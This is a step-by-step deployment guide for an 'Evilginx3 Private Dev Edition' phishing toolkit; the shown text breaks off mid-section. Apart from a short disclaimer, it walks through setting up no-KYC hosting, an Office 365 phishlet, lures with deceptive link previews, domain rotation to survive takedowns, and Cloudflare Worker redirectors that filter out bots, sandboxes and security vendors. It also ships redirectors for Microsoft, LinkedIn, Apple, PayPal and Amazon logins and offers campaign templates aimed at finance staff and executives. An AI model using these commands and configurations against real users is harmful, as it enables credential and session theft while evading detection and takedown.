<!-- markdownlint-disable-file MD013 -->

# 🚀 Evilginx 3.5.4 Private Dev Edition - Complete Deployment Guide

> **⚠️ LEGAL DISCLAIMER**: This guide is for **AUTHORIZED PENETRATION TESTING AND RED TEAM ENGAGEMENTS ONLY**. Unauthorized use is illegal. Always obtain written permission before conducting security assessments.

---

## 📑 Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [VPS Selection & Setup](#2-vps-selection--setup)
3. [Domain Configuration](#3-domain-configuration)
4. [Server Preparation](#4-server-preparation)
5. [Installation](#5-installation)
6. [SSL/TLS Certificate Setup](#6-ssltls-certificate-setup)
7. [Phishlet Configuration](#7-phishlet-configuration)
8. [Redirector Setup (Turnstile)](#8-redirector-setup-turnstile)
9. [Lure Creation & Distribution](#9-lure-creation--distribution)
10. [Domain Rotation & Multi-Domain Lures](#10-domain-rotation--multi-domain-lures)
11. [Cloudflare Workers Deployment](#11-cloudflare-workers-deployment)
12. [Advanced Features & Evasion](#12-advanced-features--evasion)
13. [Operational Security](#13-operational-security)
14. [Troubleshooting](#14-troubleshooting)
15. [Command Reference](#15-command-reference)

---

## 1. Prerequisites

### Required Resources

**Infrastructure:**

- **VPS (Linux)**: Minimum 2GB RAM, 2 CPU cores, 20GB storage (Ubuntu 20.04+/Debian 11+ recommended).
- **Windows Host**: Windows 10/11 or Server 2016+ (if deploying on Windows).
- **Domain Name**: For phishing and redirectors.
- **Cloudflare Account**: Free tier is sufficient.
- **Access**: SSH (Linux) or Administrator Access (Windows).
- **Ports**: 80 (HTTP), 443 (HTTPS), 53 (UDP/DNS) must be available.

**Knowledge Requirements:**

- Basic command line usage.
- Understanding of DNS records.
- Authorization documentation for red team engagement.

---

## 2. VPS Selection & Setup

### Recommended Providers

| Provider         | Pros                       | Cons                     | Starting Price |
| ---------------- | -------------------------- | ------------------------ | -------------- |
| **DigitalOcean** | Easy setup, good docs      | Popular (may be flagged) | $6/month       |
| **Vultr**        | Good performance, flexible | Limited regions          | $6/month       |
| **Linode**       | Reliable, established      | Moderate pricing         | $5/month       |
| **Njalla**       | Anonymous/Crypto           | Higher cost              | Varies         |

**Selection Criteria:**

- ✅ Accept cryptocurrency/privacy-focused payment.
- ✅ Don't require extensive KYC.
- ✅ Allow port 80/443 traffic.
- ✅ Located near target audience.

### Initial Access (Linux)

```bash
# Connect via SSH
ssh root@YOUR_VPS_IP

# Update system
sudo apt update && sudo apt upgrade -y

# Configure firewall basics
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 53/udp    # DNS
ufw enable
```

---

## 3. Domain Configuration

### Cloudflare Setup

1. **Add Domain to Cloudflare:**
   - Sign up at cloudflare.com.
   - Add your domain and select the **Free** plan.
   - Update your registrar's nameservers to the ones provided by Cloudflare.

2. **DNS Records:**

   Add the following records in Cloudflare. **CRITICAL: Set Proxy Status to "DNS only" (Enable the Gray Cloud, Disable the Orange Cloud).**

   | Type | Name  | Content            | Proxy Status        |
   | ---- | ----- | ------------------ | ------------------- |
   | A    | @     | YOUR_VPS_IP        | **DNS only (Gray)** |
   | A    | login | YOUR_VPS_IP        | **DNS only (Gray)** |
   | A    | www   | YOUR_VPS_IP        | **DNS only (Gray)** |
   | A    | \*    | YOUR_VPS_IP        | **DNS only (Gray)** |
   | NS   | @     | ns1.yourdomain.com | -                   |
   | NS   | @     | ns2.yourdomain.com | -                   |

   _Note: For the NS records, point them to your own domain if using Evilginx as a Nameserver, or rely on Cloudflare's management if using only simple A records._

3. **SSL/TLS Settings:**
   - Go to **SSL/TLS** -> **Edge Certificates**.
   - Enable **Always Use HTTPS**.
   - Set Minimum TLS Version to **1.2**.

---

## 4. Server Preparation

Before installing, ensure no other services are using ports 80, 443, or 53.

```bash
# Check ports
sudo netstat -tulpn | grep ':80\|:443\|:53'

# Stop conflicting services (examples)
sudo systemctl stop apache2
sudo systemctl disable apache2
sudo systemctl stop nginx
sudo systemctl disable nginx
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Fix DNS resolution after stopping systemd-resolved
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
```

---

## 5. Installation

### 5.1 Clone Repository

```bash
# Create directory
mkdir -p ~/phishing
cd ~/phishing

# Clone Evilginx3 (Private Dev Edition)
git clone https://github.com/0fukuAkz/Evilginx3.git
cd Evilginx3
```

### 5.2 Linux Automated Installer (Recommended)

For Ubuntu 20.04/22.04/24.04 and Debian 11/12 (amd64 and arm64).

```bash
chmod +x install.sh
sudo ./install.sh
```

**The installer automatically:**

- ✅ Validates OS and architecture, runs pre-flight connectivity and disk checks
- ✅ Repairs interrupted dpkg and waits for apt/dpkg locks (VPS-safe)
- ✅ Installs system dependencies (~20 packages: curl, wget, ufw, fail2ban, ca-certificates, etc.)
- ✅ Downloads and installs Go 1.25.1 with SHA256 checksum verification against go.dev
- ✅ Creates dedicated `evilginx` service user (no login shell, least-privilege)
- ✅ Stops and disables conflicting services (apache2, nginx, bind9, systemd-resolved)
- ✅ Disables systemd-resolved and writes static `/etc/resolv.conf` (frees port 53)
- ✅ Builds Evilginx from source (`CGO_ENABLED=0 go build -mod=vendor`)
- ✅ Installs binary, phishlets, redirectors, post-redirectors, web UI, GoPhish static files, GeoIP DB, and documentation to `/opt/evilginx/`
- ✅ Creates system-wide wrapper at `/usr/local/bin/evilginx` (auto-loads paths)
- ✅ Sets `CAP_NET_BIND_SERVICE` capability (bind ports 53/80/443 without root)
- ✅ Configures UFW firewall (ports 22, 53, 80, 443, 2030, 3333)
- ✅ Configures Fail2Ban for SSH brute-force protection
- ✅ Creates hardened `evilginx` systemd service (PrivateTmp, ProtectSystem=strict, NoNewPrivileges)
- ✅ Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`
- ✅ Optionally creates an admin user for SSH/management (so you can stop using root)
- ✅ Optionally sets up Cloudflare Tunnel for remote admin panel access

**Installer modes:**

```bash
sudo ./install.sh                # Full installation (default)
sudo ./install.sh --upgrade      # Rebuild + reinstall only (skip deps/firewall/service)
sudo ./install.sh --uninstall    # Remove Evilginx (binary, service, scripts, optionally config)
sudo ./install.sh --tunnel       # Cloudflare Tunnel setup only
sudo ./install.sh --dry-run      # Show what would be done without making changes
./install.sh --help              # Show usage

# Pre-set tunnel domain (skip interactive prompt)
TUNNEL_DOMAIN=example.com sudo ./install.sh
TUNNEL_DOMAIN=example.com sudo ./install.sh --tunnel
```

**Post-install commands:**

```bash
evilginx-console    # Stop service and run interactively
evilginx-start      # Start background service
evilginx-stop       # Stop service
evilginx-restart    # Restart service
evilginx-status     # Check service status
evilginx-logs       # Tail live journal logs
```

### 5.3 Windows Automated Installer

For Windows 10/11 or Server 2016+.

```powershell
# Open PowerShell as Administrator
cd C:\path\to\Evilginx3
.\install-windows.ps1
```

**The installer automatically:**

- ✅ Installs Go 1.25.1 (if missing)
- ✅ Builds from source (`CGO_ENABLED=0 go build -mod=vendor`)
- ✅ Installs binary, phishlets, redirectors, post-redirectors, web UI, GoPhish static files, and documentation to `C:\Evilginx\`
- ✅ Installs NSSM and creates a Windows Service with auto-start and log rotation
- ✅ Configures Windows Firewall (ports 53, 80, 443, 2030, 3333)
- ✅ Creates helper scripts: `evilginx-start`, `evilginx-stop`, `evilginx-restart`, `evilginx-status`, `evilginx-logs`, `evilginx-console`

**Post-install commands:**

```powershell
evilginx-console    # Configure interactively
evilginx-start      # Start Windows service
evilginx-stop       # Stop service
evilginx-status     # Check service status
evilginx-logs       # Monitor logs
```

### 5.4 Manual Installation

If you prefer to build manually:

```bash
# Install Go (Linux) — must match go.mod requirement (1.25.1+)
wget https://go.dev/dl/go1.25.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.25.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin

# Build
# Pure Go build — no CGo or C compiler required (uses modernc.org/sqlite)
# -mod=vendor uses the checked-in vendor/ directory (no network needed)
cd Evilginx3
mkdir -p build
CGO_ENABLED=0 go build -mod=vendor -o build/evilginx main.go

# Install
sudo cp build/evilginx /usr/local/bin/
sudo chmod +x /usr/local/bin/evilginx

# Allow binding to privileged ports without root
sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx

# Create config dirs and copy assets
mkdir -p ~/.evilginx/phishlets
mkdir -p ~/.evilginx/redirectors
mkdir -p ~/.evilginx/post_redirectors
cp -r phishlets/* ~/.evilginx/phishlets/
cp -r redirectors/* ~/.evilginx/redirectors/
cp -r post_redirectors/* ~/.evilginx/post_redirectors/

# Copy web UI and GoPhish static files
cp -r web ~/.evilginx/web
cp -r gophish/static ~/.evilginx/static
```

### 5.5 Docker Installation (Experimental)

```bash
# Build image
docker build -t evilginx3 .

# Run container
docker run -it \
  -p 443:443 -p 80:80 -p 53:53/udp \
  -p 2030:2030 -p 3333:3333 \
  -v $(pwd)/phishlets:/root/phishlets \
  -v ~/.evilginx:/root/.evilginx \
  evilginx3
```

---

## 6. SSL/TLS Certificate Setup

Evilginx3 uses **CertMagic** for automatic certificate management via Let's Encrypt.

1. **Start Evilginx:**

   ```bash
   evilginx
   ```

2. **Configure Domain & IP:**

   ```bash
   domains set yourdomain.com
   config ipv4 YOUR_VPS_IP
   ```

Certificates will be automatically requested and installed for any phishlet hostname you enable.

**Troubleshooting:**
If certs fail, ensure ports 80/443 are open and your DNS A records point to the VPS IP.

---

## 7. Phishlet Configuration

### Available Phishlets

This build ships with `o365` (Office 365). Additional phishlets can be added to the `phishlets/` directory — see the YAML format in the existing file as a reference.

### Enabling a Phishlet

```bash
# List phishlets
phishlets

# Configure hostname (e.g., Office 365)
phishlets hostname o365 login.yourdomain.com

# Enable
phishlets enable o365
```

---

## 8. Redirector Setup (Turnstile)

Redirectors add a layer of legitimacy and bot protection using Cloudflare Turnstile.

### Step 1: Get Turnstile Keys

1. Go to Cloudflare Dashboard > Turnstile.
2. Create a Site.
   - Mode: **Managed** (or Invisible).
   - Domain: `yourdomain.com` (or the domain hosting the redirector).
3. Copy **Site Key** and **Secret Key**.

### Step 2: Configure Redirector

1. Go to `redirectors/o365_turnstile/` (or matching phishlet name).
2. Edit `index.html`:
   - Replace `YOUR_TURNSTILE_SITE_KEY` with your actual Site Key.
3. Edit the redirect target in `index.html` (Javascript section):

   ```javascript
   window.location.href = "https://login.yourdomain.com/LURE_PATH";
   ```

### Step 3: Deploy Redirector

You can host the redirector on:

- **Cloudflare Pages / GitHub Pages** (Recommended for separation).
- **Subdomain** on your VPS.

---

## 9. Lure Creation & Distribution

Lures are the unique links you send to targets.

```bash
# Create lure for enabled phishlet
lures create o365

# Edit lure to set redirect URL (where they go AFTER fishing)
lures edit 0 redirect_url https://www.office.com

# (Optional) Set OpenGraph info for nice link previews
lures edit 0 og_title "Account Security Verification"
lures edit 0 og_image https://example.com/logo.png

# Get the phishing URL
lures get-url 0
```

> **GoPhish auto-provisioning:** `lures create` automatically provisions a matching GoPhish campaign, landing page, email template, and target group in the embedded GoPhish instance. Credentials submitted through the lure are recorded in both the Evilginx session store and the GoPhish results database (with geolocation). No manual GoPhish setup is required.

---

## 10. Domain Rotation & Multi-Domain Lures

Multi-domain rotation with simultaneous lures across different hostnames for the same phishlet.

Domain rotation lets you run **multiple domains simultaneously** for the same phishlet. Each domain gets its own lure URL, and the system can automatically rotate between them. This provides:

- **Resilience** — if one domain gets flagged, others keep working
- **Distributed traffic** — spread requests across domains to avoid detection
- **Operational flexibility** — different lures for different target segments

### Quick Start

```bash
# 1. Set your primary domain
domains set evil-domain1.com

# 2. Add additional domains to the pool
domains add evil-domain2.com "backup domain"
domains add evil-domain3.com "campaign B"

# 3. Configure your phishlet with the primary domain
phishlets hostname o365 login.evil-domain1.com
phishlets enable o365

# 4. Create lures with different hostnames
lures create o365                                        # Lure 0 (primary)
lures edit 0 hostname login.evil-domain1.com

lures create o365                                        # Lure 1 (domain 2)
lures edit 1 hostname login.evil-domain2.com

lures create o365                                        # Lure 2 (domain 3)
lures edit 2 hostname login.evil-domain3.com

# 5. Get URLs for each lure
lures get-url 0    # → https://login.evil-domain1.com/xK8mQ...
lures get-url 1    # → https://login.evil-domain2.com/pR3nL...
lures get-url 2    # → https://login.evil-domain3.com/vT9wJ...

# 6. Enable automatic rotation
domains rotation enable on
```

All three URLs are **active simultaneously** — targets can visit any of them.

### Step-by-Step Setup

#### Step 1: Configure Domains

```bash
# Set the primary (base) domain
domains set yourdomain1.com

# Add more domains into the pool
domains add yourdomain2.com "east coast campaign"
domains add yourdomain3.com "west coast campaign"

# Verify your domains
domains list
```

**Output:**

```text
Domain Pool:
─────────────────────────────────────────────────────────────
1. yourdomain1.com (active) [PRIMARY]
2. yourdomain2.com (active)
   Description: east coast campaign
3. yourdomain3.com (active)
   Description: west coast campaign
─────────────────────────────────────────────────────────────
```

> **Important:** Ensure DNS A records for all domains point to your server IP. Each domain needs wildcard or specific subdomain records configured.

#### Step 2: Set External IP

```bash
config ipv4 <YOUR_VPS_IP>
```

#### Step 3: Configure the Phishlet

```bash
# Set hostname using the primary domain
phishlets hostname o365 login.yourdomain1.com
phishlets enable o365
```

Evilginx will automatically obtain TLS certificates for the phishlet hostname.

#### Step 4: Create Multi-Domain Lures

Create a separate lure for each domain. Each lure targets the same phishlet but uses a different hostname:

```bash
# Lure for domain 1
lures create o365
lures edit 0 hostname login.yourdomain1.com
lures edit 0 redirect_url https://www.office.com
lures edit 0 og_title "Verify Your Account"

# Lure for domain 2
lures create o365
lures edit 1 hostname login.yourdomain2.com
lures edit 1 redirect_url https://www.office.com
lures edit 1 og_title "Security Check Required"

# Lure for domain 3
lures create o365
lures edit 2 hostname login.yourdomain3.com
lures edit 2 redirect_url https://www.office.com
lures edit 2 og_title "Account Verification"
```

#### Step 5: Generate Phishing URLs

```bash
lures get-url 0
lures get-url 1
lures get-url 2
```

Each URL is served on a different domain. **All are active at the same time.**

#### Step 6: Enable Domain Rotation

```bash
# Enable rotation (auto-populates pool from configured domains)
domains rotation enable on

# Set rotation strategy
domains rotation strategy round-robin

# Set rotation interval (minutes)
domains rotation interval 30
```

### Rotation Strategies

| Strategy       | Description                               | Best For                  |
| -------------- | ----------------------------------------- | ------------------------- |
| `round-robin`  | Cycles through domains sequentially       | Even traffic distribution |
| `weighted`     | Distributes based on domain health/weight | Performance optimization  |
| `health-based` | Prefers domains with best health scores   | Maximum uptime            |
| `random`       | Random domain selection                   | Unpredictable pattern     |

```bash
# Examples
domains rotation strategy round-robin
domains rotation strategy health-based
domains rotation strategy random
```

### Monitoring

#### Check Rotation Status

```bash
domains rotation
```

**Output:**

```text
Domain Rotation Configuration:
─────────────────────────────────────────────────────────────
  Enabled:           true
  Strategy:          round-robin
  Rotation Interval: 30 minutes
  Max Domains:       10
  Auto Generate:     false
─────────────────────────────────────────────────────────────
  Active Domains:    3
  Healthy Domains:   3
  Total Rotations:   12
  Compromised:       0
─────────────────────────────────────────────────────────────
```

#### View Detailed Stats

```bash
domains rotation stats
```

#### List Domains in Pool

```bash
domains rotation list
```

#### Mark a Compromised Domain

If a domain gets flagged or taken down:

```bash
domains rotation mark-compromised yourdomain2.com "reported by target"
```

This removes it from active rotation while keeping the other domains running.

### DNS Configuration

For each domain in your pool, set up DNS records:

#### Cloudflare (Recommended)

For **each domain**, add these records:

| Type | Name  | Content     | Proxy Status    |
| ---- | ----- | ----------- | --------------- |
| A    | @     | YOUR_VPS_IP | DNS only (Gray) |
| A    | login | YOUR_VPS_IP | DNS only (Gray) |
| A    | \*    | YOUR_VPS_IP | DNS only (Gray) |

> **Critical:** Proxy status must be "DNS only" (gray cloud). Orange cloud will break certificate generation.

### Advanced: Segment by Campaign

Use different domains for different target groups:

```bash
# Finance team — domain 1
lures create o365
lures edit 0 hostname login.finance-portal.com
lures edit 0 info "Finance team - Q1 campaign"
lures edit 0 og_title "Financial Report Access"

# Engineering team — domain 2
lures create o365
lures edit 1 hostname login.dev-tools-access.com
lures edit 1 info "Engineering team - Q1 campaign"
lures edit 1 og_title "Developer Portal Login"

# Executives — domain 3
lures create o365
lures edit 2 hostname login.board-meeting.com
lures edit 2 info "Executive targets - Q1 campaign"
lures edit 2 og_title "Board Meeting Materials"
```

Generate separate URLs per segment:

```bash
lures get-url 0    # Send to finance team
lures get-url 1    # Send to engineers
lures get-url 2    # Send to executives
```

### Domain Rotation Command Reference

| Command                                               | Description                               |
| ----------------------------------------------------- | ----------------------------------------- |
| `domains set <domain>`                                | Set primary (base) domain                 |
| `domains add <domain> [desc]`                         | Add domain to pool                        |
| `domains remove <domain>`                             | Remove domain from pool                   |
| `domains list`                                        | List all configured domains               |
| `domains rotation enable on`                          | Enable rotation (auto-populates pool)     |
| `domains rotation off`                                | Disable rotation                          |
| `domains rotation strategy <type>`                    | Set rotation strategy                     |
| `domains rotation interval <min>`                     | Set rotation interval                     |
| `domains rotation max-domains <n>`                    | Set max domains in pool                   |
| `domains rotation list`                               | List rotation pool domains                |
| `domains rotation stats`                              | Show rotation statistics                  |
| `domains rotation mark-compromised <domain> <reason>` | Flag a domain                             |
| `lures edit <id> hostname <host>`                     | Set lure hostname (any configured domain) |
| `lures get-url <id>`                                  | Generate phishing URL for a lure          |

### Domain Rotation Tips

1. **Stagger lure deployment** — don't send all domain URLs at once. Use domain 1 first, then switch to domain 2 if it gets flagged.
2. **Different OG metadata per lure** — customize the link preview (title, image, description) for each domain to match the campaign context.
3. **Monitor health** — use `domains rotation stats` regularly to check which domains are still healthy.
4. **Auto-populate** — when you enable rotation, all configured domains are automatically added to the rotation pool. No need to add them separately.
5. **Certificates** — Evilginx auto-obtains TLS certs for each lure hostname. Ensure ports 80/443 are open and DNS is configured before creating lures.

---

## 11. Cloudflare Workers Deployment

The Cloudflare Workers module provides **worker script generation, API-based deployment, and lifecycle management** directly from the Evilginx3 CLI. Workers run on Cloudflare's edge network and redirect visitors to the phishing infrastructure while applying filtering, anti-bot checks, and fingerprinting.

### Source Files

| File                               | Purpose                                                              |
| ---------------------------------- | -------------------------------------------------------------------- |
| `core/cloudflare_worker.go`        | Worker script generator — 3 Go templates + lure integration          |
| `core/cloudflare_worker_api.go`    | Cloudflare API client — deploy/update/delete/list/routes/status      |
| `core/dns_providers/cloudflare.go` | DNS record management via Cloudflare API (A/CNAME/TXT records)       |
| `core/config.go`                   | `CloudflareConfig` struct — persistent credential/state storage      |
| `core/domain_manager.go`           | Unified `DomainManager` — multi-domain pool, rotation, health checks |
| `core/terminal.go`                 | CLI handler — `cloudflare` command                                   |

### Worker Types

#### 1. Simple Redirect (`simple`)

- **302 redirect** to the target URL
- Optional: User-Agent filter, geo-filter, request logging, configurable delay
- Minimal footprint, fastest execution

#### 2. HTML Redirector (`html`)

- Serves an **HTML page with a loading spinner** and meta-refresh redirect
- Default 2-second delay (configurable)
- Supports custom HTML content via `CustomHtml` field
- Custom response headers support

#### 3. Advanced (`advanced`)

- All features of HTML + **anti-bot detection**:
  - Known bot User-Agent blocking (Google, Bing, Baidu, curl, wget, Python, etc.)
  - Required header validation (`Accept-Language`, `Accept-Encoding`)
  - **Data center ASN blocking** — blocks IPs from hosting/cloud providers
  - Geo-filtering by country code
- **Visitor fingerprinting** — appends `cf_ip`, `cf_country`, `cf_ts` query params to redirect URL
- Full request logging (IP, UA, referer, country, city, ASN, organization, all headers)
- Default: logging enabled, 2-second delay

### Deployment Methods

#### Method 1: CLI Auto-Deploy (Recommended)

Deploy workers directly from the Evilginx3 shell using the Cloudflare API.

##### Step 1: Configure Credentials

```bash
config cloudflare_worker account_id <your_account_id>
config cloudflare_worker api_token <your_api_token>
config cloudflare_worker zone_id <your_zone_id>        # Optional, needed for custom routes
config cloudflare_worker subdomain <your_subdomain>     # Optional, for workers.dev URL display
config cloudflare_worker enabled true
```

##### Step 2: Test Credentials

```bash
config cloudflare_worker test
# or:
cloudflare config test
```

##### Step 3: Deploy

```bash
# Basic deploy
cloudflare deploy my-redirector simple https://phish.example.com/login

# Advanced deploy with options
cloudflare deploy my-redirector advanced https://phish.example.com/login --ua-filter "Mozilla|Chrome|Firefox" --geo US,CA,GB --delay 3 --log --subdomain --route "*.example.com/*"
```

The worker will be available at: `https://<worker-name>.<subdomain>.workers.dev`

##### Step 4: Manage Workers

```bash
cloudflare list                              # List all deployed workers
cloudflare status <worker_name>              # Check deployment status + URL
cloudflare update <worker_name> <new_url>    # Update redirect URL
cloudflare delete <worker_name>              # Remove a worker
```

#### Method 2: Generate & Manual Deploy

Generate a worker script file, then deploy it manually via the Cloudflare dashboard or `wrangler` CLI.

##### Step 1: Generate Script

```bash
# Generate simple redirect
cloudflare worker simple https://phish.example.com/login

# Generate from a lure
cloudflare worker advanced --lure 0

# Generate with options
cloudflare worker html https://phish.example.com/login --ua-filter "Mozilla" --geo US,GB --delay 5 --log
```

This creates a file like `cloudflare-worker-advanced-20260304-021625.js`.

##### Step 2: Deploy via Cloudflare Dashboard

1. Go to **Cloudflare Dashboard → Workers & Pages → Create Application → Create Worker**
2. Paste the generated JavaScript into the editor
3. Deploy and note the `*.workers.dev` URL

##### Step 3: Deploy via Wrangler CLI (Alternative)

```bash
npm install -g wrangler
wrangler login
wrangler deploy cloudflare-worker-advanced-20260304-021625.js --name my-redirector
```

#### Method 3: Lure-Based Generation

Generate workers tied directly to an existing lure configuration.

```bash
# Generate worker from lure ID 0
cloudflare worker advanced --lure 0

# Deploy worker from lure
cloudflare deploy lure-worker advanced --lure 0 --subdomain
```

This automatically:

- Extracts the redirect URL from the lure's `hostname` + `path`
- Inherits the lure's `ua_filter`
- Falls back to `redirect_url` if configured on the lure

### Cloudflare Workers Configuration Reference

#### `CloudflareConfig` (persisted in `config.json`)

| Field             | Config Key                           | Required | Description                             |
| ----------------- | ------------------------------------ | -------- | --------------------------------------- |
| `AccountID`       | `cloudflare_worker.account_id`       | Yes      | Cloudflare account ID                   |
| `APIToken`        | `cloudflare_worker.api_token`        | Yes      | API token with Workers permissions      |
| `ZoneID`          | `cloudflare_worker.zone_id`          | No       | Required only for custom route patterns |
| `WorkerSubdomain` | `cloudflare_worker.worker_subdomain` | No       | Your `*.workers.dev` subdomain          |
| `Enabled`         | `cloudflare_worker.enabled`          | Yes      | Must be `true` for API deployments      |

#### `CloudflareWorkerConfig` (per-worker generation)

| Field             | CLI Flag      | Description                          |
| ----------------- | ------------- | ------------------------------------ |
| `Type`            | positional    | `simple`, `html`, or `advanced`      |
| `RedirectUrl`     | positional    | Target URL for redirection           |
| `UserAgentFilter` | `--ua-filter` | Regex to whitelist User-Agents       |
| `GeoFilter`       | `--geo`       | Comma-separated country codes        |
| `DelaySeconds`    | `--delay`     | Seconds to wait before redirect      |
| `LogRequests`     | `--log`       | Enable console logging of requests   |
| `CustomHtml`      | (code only)   | Custom HTML for the html worker type |
| `Headers`         | (code only)   | Custom response headers              |

### Cloudflare Workers CLI Commands

| Command         | Syntax                                              | Description                           |
| --------------- | --------------------------------------------------- | ------------------------------------- |
| **Generate**    | `cloudflare worker <type> <redirect_url> [options]` | Generate a `.js` worker script file   |
| **Deploy**      | `cloudflare deploy <name> <type> <url> [options]`   | Deploy worker to Cloudflare via API   |
| **List**        | `cloudflare list`                                   | List all deployed workers with URLs   |
| **Delete**      | `cloudflare delete <worker_name>`                   | Delete a deployed worker              |
| **Update**      | `cloudflare update <worker_name> <url>`             | Update a worker's redirect URL        |
| **Status**      | `cloudflare status <worker_name>`                   | Check if worker is deployed + get URL |
| **Config**      | `cloudflare config`                                 | Show current Cloudflare configuration |
| **Config Set**  | `cloudflare config <key> <value>`                   | Set a config value                    |
| **Config Test** | `cloudflare config test`                            | Validate API credentials              |

#### Deploy-Only Options

| Flag                | Description                                        |
| ------------------- | -------------------------------------------------- |
| `--route <pattern>` | Create a custom route pattern (requires `zone_id`) |
| `--subdomain`       | Enable `workers.dev` subdomain access              |

### Cloudflare Workers API Internals

The `CloudflareWorkerAPI` struct wraps the Cloudflare REST API (`https://api.cloudflare.com/client/v4`):

| Method                | API Endpoint                                   | Purpose                        |
| --------------------- | ---------------------------------------------- | ------------------------------ |
| `DeployWorker`        | `PUT /accounts/{id}/workers/scripts/{name}`    | Upload worker script           |
| `UpdateWorker`        | `PUT /accounts/{id}/workers/scripts/{name}`    | Replace worker script          |
| `DeleteWorker`        | `DELETE /accounts/{id}/workers/scripts/{name}` | Remove worker                  |
| `ListWorkers`         | `GET /accounts/{id}/workers/scripts`           | List all workers               |
| `CreateWorkerRoute`   | `POST /zones/{id}/workers/routes`              | Bind worker to URL pattern     |
| `ListWorkerRoutes`    | `GET /zones/{id}/workers/routes`               | List route bindings            |
| `DeleteWorkerRoute`   | `DELETE /zones/{id}/workers/routes/{route_id}` | Remove route                   |
| `ValidateCredentials` | `GET /accounts/{id}`                           | Test API token validity        |
| `GetWorkerSubdomain`  | `GET /accounts/{id}/workers/subdomain`         | Retrieve workers.dev subdomain |
| `GetWorkerStatus`     | (via `ListWorkers`)                            | Check if named worker exists   |

### Cloudflare Turnstile Redirectors

The `redirectors/` directory contains **pre-built HTML pages** that integrate with Cloudflare Turnstile for bot protection. These are separate from Workers but complement them:

| Redirector            | Target                    |
| --------------------- | ------------------------- |
| `o365_turnstile/`     | Microsoft 365 login pages |
| `linkedin_turnstile/` | LinkedIn login pages      |
| `apple_turnstile/`    | Apple ID login pages      |
| `paypal_turnstile/`   | PayPal login pages        |
| `amazon_turnstile/`   | Amazon login pages        |

These require a **Cloudflare Turnstile Site Key** (configured in the HTML). Deploy these via **Cloudflare Pages** or **GitHub Pages** as static sites.

### Domain Management Integration with Workers

Workers redirect traffic to domains managed by the unified `DomainManager`. All domain operations are handled through the `domains` command:

```bash
# Add domains to the pool
domains add phish.example.com "Primary phishing domain"
domains add backup.example.com "Backup domain"

# Set primary (used as default worker redirect target)
domains primary phish.example.com

# View all domains with health/status
domains health

# Mark a burned domain as compromised (auto-generates replacement if enabled)
domains compromise phish.example.com "flagged by Google Safe Browsing"
```

#### Domain Rotation for Workers

When domain rotation is enabled, the `DomainManager` cycles through active domains using the configured strategy. Workers should point to the current active domain:

```bash
# Enable rotation
domains rotation on
domains rotation strategy health-based
domains rotation interval 30

# Add DNS providers for auto-generation
domains rotation add-provider cf cloudflare <api_key> <api_secret> <zone>

# Enable automatic replacement of compromised domains
domains rotation auto-generate on
```

#### Domain Status Values

| Status        | Meaning                                                            |
| ------------- | ------------------------------------------------------------------ |
| `active`      | Domain is healthy and serving traffic                              |
| `inactive`    | Domain is disabled (manual or health check failure)                |
| `compromised` | Domain is burned — removed from rotation, triggers auto-generation |

### DNS Provider Integration

The `dns_providers/cloudflare.go` module manages DNS records through the Cloudflare API:

- **CRUD for DNS records**: A, CNAME, TXT (for ACME challenges)
- **Zone lookup by domain** with caching
- Authentication via API Token or API Key + Email
- Used by the certificate system for automated DNS-01 challenges
- DNS providers can be registered with `DomainManager` for automatic domain generation and rotation via `domains rotation add-provider`

### Obtaining Cloudflare Credentials

#### Account ID

1. Log in to Cloudflare Dashboard
2. Click on any domain → **Overview** tab
3. Scroll down to **API** section on the right sidebar → copy **Account ID**

#### API Token

1. Go to **My Profile → API Tokens → Create Token**
2. Use the **"Edit Cloudflare Workers"** template, or create custom with:
   - `Account.Workers Scripts`: Edit
   - `Zone.Workers Routes`: Edit (if using custom routes)
   - `Account.Account Settings`: Read (for credential validation)

#### Zone ID (Optional)

1. Same location as Account ID — copy the **Zone ID** from the domain overview page
2. Only needed if you plan to create custom route patterns

#### Workers Subdomain

1. Go to **Workers & Pages** in the dashboard
2. Your subdomain appears as `<subdomain>.workers.dev`

---

## 12. Advanced Features & Evasion

This Private Dev Edition references `config.json` for advanced settings.

### Configuration Reference (`~/.evilginx/config.json`)

```json
{
  "ja3_fingerprinting": {
    "enabled": true,
    "block_known_bots": true
  },
  "sandbox_detection": {
    "enabled": true,
    "mode": "active",
    "action_on_detection": "redirect"
  },
  "polymorphic_engine": {
    "enabled": true,
    "mutation_level": "high",
    "seed_rotation": 15
  },
  "traffic_shaping": {
    "enabled": true,
    "per_ip_rate_limit": 100,
    "ddos_protection": true
  }
}
```

**Commands:**

```bash
antibot enabled true
antibot action spoof
antibot spoof_url https://google.com
```

### Web API Dashboard

A built-in JSON API and web dashboard run automatically on port **2030**, providing full remote management of phishlets, lures, sessions, config, and users.

> **Security:** Port 2030 binds to `0.0.0.0` (all interfaces) over **HTTP only** — traffic is unencrypted. The installer opens it to the internet via UFW. Harden before exposing to the network:

```bash
# Restrict port 2030 to your operator IP only
sudo ufw delete allow 2030/tcp
sudo ufw allow from YOUR_OPERATOR_IP to any port 2030

# Or use an SSH tunnel instead of exposing the port at all
ssh -L 2030:127.0.0.1:2030 root@YOUR_VPS_IP
# Then open http://localhost:2030 in your browser
```

**Default credentials** are printed to stdout on first start:

```text
Web Admin default credentials:
  Username: admin
  Password: <random 32-char token>
```

Change it immediately after first login via the dashboard or API:

```bash
curl -s -b cookies.txt -X POST http://localhost:2030/api/auth/change-password \
  -H "Content-Type: application/json" \
  -d '{"old_password":"OLD","new_password":"NEW_STRONG_PASSWORD"}'
```

**User roles** (`admin` only can manage users):

| Role       | Capabilities                                                      |
| ---------- | ----------------------------------------------------------------- |
| `admin`    | Full access including user management                             |
| `operator` | Manage phishlets, lures, sessions, config (default for new users) |
| `viewer`   | Read-only — all mutation endpoints return 403                     |

```bash
# Create an operator account (admin credentials required)
curl -s -b cookies.txt -X POST http://localhost:2030/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"operator1","password":"StrongPass","role":"operator"}'
```

**Session export with filters:**

```bash
# All sessions for a specific phishlet
GET /api/sessions/export?phishlet=o365

# Only sessions that captured credentials
